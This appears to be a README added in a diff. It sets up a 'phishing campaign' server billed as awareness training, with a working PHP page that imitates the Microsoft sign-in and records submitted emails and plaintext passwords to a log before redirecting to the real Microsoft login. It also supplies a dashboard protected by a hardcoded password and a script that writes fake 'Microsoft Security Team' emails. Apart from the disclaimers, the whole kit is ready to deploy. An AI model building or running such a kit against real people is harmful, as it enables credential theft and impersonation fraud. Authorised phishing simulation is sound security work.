@@ -1,0 +1,331 @@
+Phishing Campaign Infrastructure & Tracker
+A controlled phishing infrastructure for security awareness training that tracks user engagement and credential submissions.
+
+⚠️ LEGAL & ETHICAL DISCLAIMER
+THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY AWARENESS TRAINING ONLY
+
+Only use on systems you own or have explicit written permission to test
+
+Always obtain proper authorization before deployment
+
+Immediately delete captured credentials after testing
+
+Consult legal counsel before use in organizational settings
+
+Use responsibly and ethically
+
+Features
+Microsoft 365-style phishing login page
+
+Credential capture with file-based logging
+
+Unique tracking IDs for campaign analytics
+
+Real-time dashboard for monitoring
+
+Automatic redirect to legitimate login page
+
+Email template generator for campaigns
+
+Prerequisites
+Ubuntu Linux (tested on 22.04+)
+
+Raspberry Pi or similar device
+
+Basic command line knowledge
+
+Quick Start
+1. Initial Setup
+bash
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install required packages
+sudo apt install nginx php-fpm php-cli php-sqlite3 python3 sqlite3
+
+# Create project directory
+sudo mkdir -p /var/www/phishcamp
+sudo chown -R $USER:$USER /var/www/phishcamp
+cd /var/www/phishcamp
+2. Configure Web Server
+Create Nginx configuration:
+
+bash
+sudo nano /etc/nginx/sites-available/phishcamp
+Add:
+
+nginx
+server {
+    listen 80;
+    server_name _;
+    root /var/www/phishcamp;
+    index index.php index.html;
+
+    location / {
+        try_files $uri $uri/ =404;
+    }
+
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        include fastcgi_params;
+    }
+
+    location ~* \.(log|db)$ {
+        deny all;
+    }
+}
+Enable the site:
+
+bash
+sudo ln -s /etc/nginx/sites-available/phishcamp /etc/nginx/sites-enabled/
+sudo rm -f /etc/nginx/sites-enabled/default
+sudo nginx -t
+sudo systemctl reload nginx
+3. Create Phishing Landing Page
+Create index.php:
+
+php
+<?php
+// Simple logging to file
+if ($_POST) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $email = $_POST['email'] ?? 'unknown';
+    $password = $_POST['password'] ?? 'unknown';
+    $tracking_id = $_GET['tid'] ?? 'direct';
+    
+    $log_entry = date('Y-m-d H:i:s') . " | IP: $ip | Tracking: $tracking_id | Email: $email | Password: $password | Agent: $user_agent\n";
+    file_put_contents('/var/www/phishcamp/credentials.log', $log_entry, FILE_APPEND);
+    
+    header('Location: https://login.microsoftonline.com/');
+    exit;
+}
+
+// Log page view
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$tracking_id = $_GET['tid'] ?? 'direct';
+$log_entry = date('Y-m-d H:i:s') . " | PAGEVIEW | IP: $ip | Tracking: $tracking_id | Agent: $user_agent\n";
+file_put_contents('/var/www/phishcamp/access.log', $log_entry, FILE_APPEND);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: white; }
+        .container { max-width: 400px; margin: 0 auto; padding: 40px; border: 1px solid #e1e1e1; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; }
+        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Sign in</h2>
+        <form method="POST">
+            <input type="text" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+</body>
+</html>
+4. Create Dashboard
+Create dashboard.php:
+
+php
+<?php
+// Authentication
+if (!isset($_SERVER['PHP_AUTH_USER']) || 
+    $_SERVER['PHP_AUTH_USER'] !== 'admin' || 
+    $_SERVER['PHP_AUTH_PW'] !== 'phishcamp123') {
+    header('WWW-Authenticate: Basic realm="Dashboard"');
+    header('HTTP/1.0 401 Unauthorized');
+    exit('Unauthorized');
+}
+
+// Read logs
+$credentials = file_exists('credentials.log') ? file_get_contents('credentials.log') : 'No data';
+$access = file_exists('access.log') ? file_get_contents('access.log') : 'No data';
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phishing Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .log { background: #f5f5f5; padding: 15px; margin: 10px 0; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>Phishing Campaign Dashboard</h1>
+    <h2>Captured Credentials</h2>
+    <div class="log"><?php echo htmlspecialchars($credentials); ?></div>
+    <h2>Access Logs</h2>
+    <div class="log"><?php echo htmlspecialchars($access); ?></div>
+</body>
+</html>
+5. Create Email Generator
+Create email_generator.py:
+
+python
+#!/usr/bin/env python3
+import random
+import string
+
+def generate_tracking_id():
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+
+def create_phishing_email(template_name, target_email, base_url="http://YOUR_SERVER_IP"):
+    templates = {
+        'microsoft_security': {
+            'subject': 'Security Update: Verify Your Microsoft Account',
+            'body': f'''Dear User,
+
+We've detected unusual activity in your Microsoft account. For your security, we require you to verify your account immediately.
+
+Please sign in to review the activity: {base_url}/?tid={generate_tracking_id()}
+
+Thank you,
+Microsoft Security Team'''
+        }
+    }
+    
+    template = templates.get(template_name, templates['microsoft_security'])
+    tracking_id = generate_tracking_id()
+    
+    return {
+        'to': target_email,
+        'subject': template['subject'],
+        'body': template['body'],
+        'tracking_id': tracking_id,
+        'url': f'{base_url}/?tid={tracking_id}'
+    }
+
+if __name__ == '__main__':
+    email = create_phishing_email('microsoft_security', 'test@company.com')
+    print(f"To: {email['to']}")
+    print(f"Subject: {email['subject']}")
+    print(f"URL: {email['url']}")
+    print(f"Body:\n{email['body']}")
+6. Set Permissions
+bash
+sudo chown -R www-data:www-data /var/www/phishcamp
+sudo chmod -R 755 /var/www/phishcamp
+sudo touch /var/www/phishcamp/access.log /var/www/phishcamp/credentials.log
+sudo chmod 666 /var/www/phishcamp/*.log
+7. Start Services
+bash
+sudo systemctl start php8.4-fpm
+sudo systemctl enable php8.4-fpm
+sudo systemctl restart nginx
+Usage
+Running a Phishing Campaign
+Generate phishing emails:
+
+bash
+cd /var/www/phishcamp
+python3 email_generator.py
+Send emails with generated tracking URLs
+
+Monitor results:
+
+Dashboard: http://YOUR_SERVER_IP/dashboard.php
+
+Username: admin
+
+Password: phishcamp123
+
+View real-time logs:
+
+bash
+tail -f /var/www/phishcamp/credentials.log
+Example Campaign
+bash
+# Generate campaign URL
+python3 -c "
+import random, string
+tid = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', k=8))
+print(f'Campaign URL: http://YOUR_SERVER_IP/?tid={tid}')
+"
+
+# Test the campaign
+curl "http://YOUR_SERVER_IP/?tid=TEST123"
+Security Considerations
+Firewall Configuration
+bash
+sudo ufw allow 'Nginx HTTP'
+sudo ufw allow ssh
+sudo ufw enable
+Secure Log Files
+bash
+sudo chmod 640 /var/www/phishcamp/*.log
+Regular Maintenance
+Delete captured credentials after testing
+
+Rotate log files regularly
+
+Update passwords frequently
+
+Troubleshooting
+Common Issues
+500 Internal Server Error
+
+bash
+# Check PHP error log
+sudo tail -f /var/log/php8.4-fpm.log
+
+# Check Nginx error log  
+sudo tail -f /var/log/nginx/error.log
+Permission Denied
+
+bash
+sudo chown -R www-data:www-data /var/www/phishcamp
+sudo chmod -R 755 /var/www/phishcamp
+Page Not Loading
+
+bash
+# Check services
+sudo systemctl status nginx
+sudo systemctl status php8.4-fpm
+
+# Test PHP processing
+echo "<?php phpinfo(); ?>" > /var/www/phishcamp/test.php
+Advanced Features
+Custom Templates
+Modify email_generator.py to add new phishing email templates:
+
+python
+'new_template': {
+    'subject': 'Your Custom Subject',
+    'body': 'Your custom email body with {tracking_url}'
+}
+Enhanced Tracking
+Add geolocation or device fingerprinting by modifying the logging in index.php.
+
+🎓 Educational Use
+This tool is designed for:
+
+Security awareness training
+
+Phishing simulation exercises
+
+Social engineering testing (with authorization)
+
+Blue team training and exercises
+
+License
+This project is for educational purposes only. Users are responsible for ensuring they have proper authorization before deployment.
+
+Contributing
+When contributing to this project:
+
+Ensure all code includes proper ethical use warnings
+
+Include documentation for legal compliance
+
+Test thoroughly in isolated environments
+
+Remember: Always obtain explicit permission before testing and immediately delete any captured data after educational use.
